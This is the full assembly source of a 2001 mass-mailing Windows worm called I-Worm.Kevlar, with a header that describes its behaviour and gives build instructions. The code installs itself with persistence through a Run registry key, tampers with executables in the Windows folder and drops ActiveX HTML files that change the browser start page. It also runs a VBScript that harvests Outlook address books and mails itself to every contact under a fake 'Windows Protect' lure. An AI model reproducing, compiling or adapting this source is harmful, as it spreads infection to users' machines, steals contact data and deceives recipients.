comment #
Name : I-Worm.Kevlar
Author : PetiK
Date : August 7th 2001 - August 16th 2001
Size : 5120 byte

Action : Copy itself to %System%\Kevlar32.exe hidden attribute
			%System%\MScfg32.exe normal attribute
	 Add HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Kevlar32 = %System%\Kevlar32.exe

	* Infect %Windir%\C???????.exe file on writing as "PetiK" in the file
	* Infect %Windir%\*.exe It add .htm and create a new file with ActiveX
	* Create C:\__.vbs This filetake all address in th e Address Book at save them in the
	  %windir%\AddBook.txt. The worm scan this file to find the address and send a new mail :

		Subject : Windows Protect !!
		Body :  The smallest software to stop your computer to bug in each time.
			I have found this program on WWW.KEVLAR-PROTECT.COM

			Take a look at the attchment.

					Bye and have a nice day.

		Attachment : MScfg32.exe

	* It creates the %windir%\MSinfo32.txt. I look like this :

		[File Infected]		=> Name of C???????.exe file infected
		CLEANMGR.EXE=Infected by W32.Kevlar.PetiK
		CVTAPLOG.EXE=Infected by W32.Kevlar.PetiK

		[EMail saved]		=> Some address found in the address book
		first@mail.com=Next victim
		second@mail.com=Next victim


To build the worm:
tasm32 /M /ML Kevlar
tlink32 -Tpe -aa -x Kevlar,,,import32
upx -9 Kevlar.exe

To delete the worm:
@echo off
del %windir%\system\Kevlar32.exe
del %windir%\system\MScfg32.exe
del %windir%\*.exe.htm
del %windir%\MSinfo32.txt
del %windir%\AddBook.txt

#

.586p
.model flat
.code

JUMPS

callx macro a
extrn a:proc
call a
endm

include useful.inc

DEBUT:	
F_NAME:	push  50
	mov   esi,offset Orig
	push  esi
	push  0
	callx GetModuleFileNameA

	mov   edi,offset CopyName2
	push  edi
	push  50
	push  edi
	callx GetSystemDirectoryA
	add   edi,eax
	mov   eax,'cSM\'
	stosd
	mov   eax,'23gf'
	stosd
	mov   eax,'exe.'
	stosd
	pop   edi
	push  0
	push  edi
	push  esi
	callx CopyFileA

	mov   edi,offset CopyName
	push  edi
	push  50
	push  edi
	callx GetSystemDirectoryA
	add   edi,eax
	mov   al,'\'
	stosb
	mov   eax,'lveK'
	stosd
	mov   eax,'23ra'
	stosd
	mov   eax,'exe.'
	stosd
	pop   edi

	push  esi
	callx GetFileAttributesA
	cmp   eax,1
	je    SUITE

	push  0
	push  edi
	push  esi
	callx CopyFileA

	push  01h
	push  edi
	callx SetFileAttributesA


REG:	pushad
	@pushsz "SHLWAPI.dll"
	callx LoadLibraryA
	test  eax,eax
	jz    FIN
	mov   edi,eax
	@pushsz "SHSetValueA"
	push  edi
	callx GetProcAddress
	test  eax,eax
	jz    FIN
	mov   esi,eax
	push  08h
	push  offset CopyName
	push  01h
	@pushsz "Kevlar32"
	@pushsz "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
	push  80000002h
	call  esi
	push  edi
	callx FreeLibrary
	popad

	call  Nick
	
	mov   edi,offset nickname
	push  40h
	@pushsz "Hello, my name is :"
	push  edi
	push  0
	callx MessageBoxA

	call  Infect

	jmp   FIN

SUITE:	call  Infect2
VB_F:	pushad
	push  00h
	push  80h
	push  02h
	push  00h
	push  01h
	push  40000000h
	@pushsz "C:\__.vbs"
	callx CreateFileA
	test  eax,eax
	xchg  edi,eax
	push  00h
	push  offset octets
	push  VBSSIZE
	push  offset vbsd
	push  edi
	callx WriteFile
	push  edi
	callx CloseHandle
	popad
	push  1
	@pushsz "wscript C:\__.vbs"
	callx WinExec
	push  10000
	callx Sleep
	@pushsz "C:\__.vbs"
	callx DeleteFileA

SCAN1:	mov   edi,offset addbook
	push  edi
	push  50
	push  edi
	callx GetWindowsDirectoryA
	add   edi,eax
	mov   eax,"ddA\"
	stosd
	mov   eax,"kooB"
	stosd
	mov   eax,"txt."
	stosd
	xor   eax,eax
	stosd
	call  OPEN

FIN:	push  00h
	callx ExitProcess

	Nick 	Proc
	mov   edi,offset nickname
	callx GetTickCount
	push  9
	pop   ecx
	xor   edx,edx
	div   ecx
	inc   edx
	mov   ecx,edx
	name_g:
	push  ecx
	callx GetTickCount
	push  'Z'-'A'
	pop   ecx
	xor   edx,edx
	div   ecx
	xchg  eax,edx
	add   al,'A'
	stosb
	callx GetTickCount
	push  100
	pop   ecx
	xor   edx,edx
	div   ecx
	push  edx
	callx Sleep
	pop   ecx
	loop  name_g
	ret
	Nick	EndP

	Infect  Proc
	pushad
	push  50
	push  offset WinPath
	callx GetWindowsDirectoryA
	push  offset WinPath
	callx SetCurrentDirectoryA
	FFF:
	push  offset Search
	@pushsz "C???????.exe"
	callx FindFirstFileA
	inc   eax
	je    F_INF
	dec   eax
	mov   [exeHdl],eax
	I_FILE:
	mov   verif,0
	xor   eax,eax
	push  eax
	push  eax
	push  03h
	push  eax
	push  eax
	push  80000000h or 40000000h
	push  offset Search.cFileName
	callx CreateFileA
	inc   eax
	jz    FNF
	dec   eax
	xchg  eax,ebx

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  04h
	push  eax
	push  ebx	
	callx CreateFileMappingA
	test  eax,eax
	jz    CL1
	xchg  eax,ebp

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  06h
	push  ebp
	callx MapViewOfFile
	test  eax,eax
	jz    CL2
	xchg  eax,edi
	
	mov   esi,eax
	cmp   word ptr [esi],"ZM"
	jne   CL2
	cmp   byte ptr [esi+18h],"@"
	jne   CL2
	cmp   word ptr [esi+80h],"EP"
	jne   CL2
	cmp   byte ptr [esi+12h],"P"
	je    CL2
	mov   word ptr [esi+12h],"eP"
	mov   word ptr [esi+14h],"it"
	mov   byte ptr [esi+16h],"K"
	inc   verif
	push  edi
	callx UnmapViewOfFile
	CL2:
	push  ebp
	callx CloseHandle
	CL1:
	push  ebx
	callx CloseHandle

	cmp   verif,1
	jne   FNF
	mov   edi,offset InfoFile
	push  edi
	push  50
	push  edi
	callx GetWindowsDirectoryA
	add   edi,eax
	mov   eax,'iSM\'
	stosd
	mov   eax,'3ofn'
	stosd
	mov   eax,'xt.2'
	stosd
	mov   al,'t'
	stosb
	pop   edi
	mov   esi,edi
	push  esi
	@pushsz "Infected by W32.Kevlar.PetiK"
	push    offset Search.cFileName
	@pushsz "File Infected"	
	callx   WritePrivateProfileStringA

	FNF:
	push  offset Search
	push  [exeHdl]
	callx FindNextFileA
	test  eax,eax
	jne   I_FILE
	FC:
	push  [exeHdl]
	callx FindClose
	F_INF:
	popad
	ret
	Infect	EndP

	Infect2	Proc
	pushad
	push  50
	push  offset WinPath
	callx GetWindowsDirectoryA
	push  offset WinPath
	callx SetCurrentDirectoryA
	FFF2:
	push  offset Search
	@pushsz "*.exe"
	callx FindFirstFileA
	inc   eax
	je    F_INF2
	dec   eax
	mov   [exeHdl],eax
	I_FILE2:
	pushad
	mov   edi,offset Search.cFileName
	push  edi
	callx lstrlen
	add   edi,eax
	mov   eax,"mth."
	stosd
	xor   eax,eax
	stosd
	push  00h
	push  80h
	push  02h
	push  00h
	push  01h
	push  40000000h
	push  offset Search.cFileName
	callx CreateFileA
	test  eax,eax
	xchg  ebp,eax
	push  00h
	push  offset octets
	push  HTMSIZE
	push  offset htmd
	push  ebp
	callx WriteFile
	push  ebp
	callx CloseHandle
	popad
	FNF2:
	push  offset Search
	push  [exeHdl]
	callx FindNextFileA
	test  eax,eax
	jne   I_FILE2
	FC2:
	push  [exeHdl]
	callx FindClose
	F_INF2:
	popad
	ret
	Infect2	EndP

OPEN:	pushad
	push  00h
	push  80h
	push  03h
	push  00h
	push  01h
	push  80000000h
	push  offset addbook
	callx CreateFileA
	inc   eax
	je    NO
	dec   eax
	xchg  eax,ebx

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  02h
	push  eax
	push  ebx
	callx CreateFileMappingA
	test  eax,eax
	je    F1
	xchg  eax,ebp

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  04h
	push  ebp
	callx MapViewOfFile
	test  eax,eax
	je    F2
	xchg  eax,esi

	push  00h
	push  ebx
	callx GetFileSize
	cmp   eax,03h
	jbe   F3					; is the file empty ??

	call  SCAN

F3:	push  esi
	callx UnmapViewOfFile
F2:	push  ebp
	callx CloseHandle
F1:	push  ebx
	callx CloseHandle
NO:	popad
	ret

	SCAN:
	pushad
	xor   edx,edx
	mov   edi,offset m_addr
	push  edi
	p_c:  lodsb
	cmp   al," "
	je    car_s
	cmp   al,0dh
	je    entr1
	cmp   al,0ah
	je    entr2
	cmp   al,"!"
	je    f_mail
	cmp   al,"@"
	je    not_a
	inc   edx
	not_a:	stosb
		jmp p_c
	car_s:	inc esi
		jmp p_c
	entr1:	xor al,al
		stosb
		pop edi
		test edx,edx
		je  SCAN
		call SEND_MAIL
		jmp SCAN
	entr2:	xor al,al
		stosb
		pop edi
		jmp SCAN
	f_mail:	popad
		ret

	SEND_MAIL:
		push  50
		push  offset save_addr
		callx GetWindowsDirectoryA
		@pushsz "\MSinfo32.txt"
		push  offset save_addr
		callx lstrcat
		push  offset save_addr
		@pushsz "Next victim"
		push  offset m_addr
		@pushsz "EMail saved"	
		callx   WritePrivateProfileStringA
		xor   eax,eax
		push  eax
		push  eax
		push  offset Message
		push  eax
		push  [MAPIHdl]
		callx MAPISendMail
		ret



.data
; ===== INSTALLATION =====
Orig		db 50 dup (0)
CopyName	db 50 dup (0)
CopyName2	db 50 dup (0)
nickname	db 11 dup (?)

; ===== INFECTION =====
InfoFile	db 50 dup (0)
WinPath		db 50 dup (0)
exeHdl		dd ?
verif		dd ?
octets		dd ?

; ===== MAIL =====
addbook		db 50 dup (0)
save_addr	db 50 dup (0)
m_addr		db 128 dup (?)
MAPIHdl		dd 0
subject		db "Windows Protect !!",00h
body		db "The smallest software to stop your computer to bug in each time.",0dh,0ah
		db "I have found this program on WWW.KEVLAR-PROTECT.COM",0dh,0ah,0dh,0ah
		db "Take a look at the attchment.",0dh,0ah,0dh,0ah
		db 09h,09h,"Bye and have a nice day.",00h
NameFrom	db "Your friend",00h


Message		dd ?
		dd offset subject
		dd offset body
		dd ?
		dd ?
		dd ?
		dd 2
		dd offset MsgFrom
		dd 1
		dd offset MsgTo
		dd 1
		dd offset Attach

MsgFrom		dd ?
		dd ?
		dd NameFrom
		dd ?
		dd ?
		dd ?

MsgTo		dd ?
		dd 1
		dd offset m_addr
		dd offset m_addr
		dd ?
		dd ?

Attach		dd ?
		dd ?
		dd ?
		dd offset CopyName2
		dd ?
		dd ?

		

htmd:
db '<html><head><title>PetiKVX come back</title></head><body>',0dh,0ah
db '<script language=vbscript>',0dh,0ah
db 'on error resume next',0dh,0ah
db 'set fso=createobject("scripting.filesystemobject")',0dh,0ah
db 'If err.number=429 then',0dh,0ah
db 'document.write "<font face=''verdana'' size=''2'' color=''#FF0000''>'
db 'You need ActiveX enabled to see this file<br><a href=''javascript:location.reload()''>'
db 'Click Here</a> to reload and click Yes</font>"',0dh,0ah
db 'Else',0dh,0ah
db 'Set ws=CreateObject("WScript.Shell")',0dh,0ah
db 'document.write "<font face=''verdana'' size=''3'' color=red>'
db 'This page is generate by a worm<br>But this worm is proteced by Kevlar<br></font>"',0dh,0ah
db 'document.write "<font face=''verdana'' size=''2'' color=blue><br>'
db 'Worms are not dangerous for your computer but to survive, they must be strong</font>"',0dh,0ah
db 'ws.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.avp.ch"',0dh,0ah
db 'End If',0dh,0ah
db '</script></html>',00h
HTMSIZE	= $-htmd

vbsd:
db 'On Error Resume Next',0dh,0ah
db 'Set Kevlar = CreateObject("Outlook.Application")',0dh,0ah
db 'Set L = Kevlar.GetNameSpace("MAPI")',0dh,0ah
db 'Set f=CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'Set c=f.CreateTextFile(f.GetSpecialFolder(0)&"\AddBook.txt")',0dh,0ah
db 'c.Close',0dh,0ah
db 'For Each M In L.AddressLists',0dh,0ah
db 'If M.AddressEntries.Count <> 0 Then',0dh,0ah
db 'For O = 1 To M.AddressEntries.Count',0dh,0ah
db 'Set P = M.AddressEntries(O)',0dh,0ah
db 'Set c=f.OpenTextFile(f.GetSpecialFolder(0)&"\AddBook.txt",8,true)',0dh,0ah
db 'c.WriteLine P.Address',0dh,0ah
db 'c.Close',0dh,0ah
db 'Next',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
db 'Set c=f.OpenTextFile(f.GetSpecialFolder(0)&"\AddBook.txt",8,true)',0dh,0ah
db 'c.WriteLine "!"',0dh,0ah
db 'c.Close',0dh,0ah
VBSSIZE	= $-vbsd

signature	db "I-Worm.Kevlar coded by PetiK (c)2001",00h


MAX_PATH		equ 260
FILETIME		struct
dwLowDateTime		dd ?
dwHighDateTime		dd ?
FILETIME		ends
WIN32_FIND_DATA 	struct
dwFileAttributes	dd ?
ftCreationTime		FILETIME ?
ftLastAccessTime	FILETIME ?
ftLastWriteTime		FILETIME ?
nFileSizeHigh		dd ?
nFileSizeLow		dd ?
dwReserved0		dd ?
dwReserved1		dd ?
cFileName		dd MAX_PATH (?)
cAlternateFileName	db 13 dup (?)
			db 3 dup (?)
WIN32_FIND_DATA		ends

Search		WIN32_FIND_DATA <>


end DEBUT
end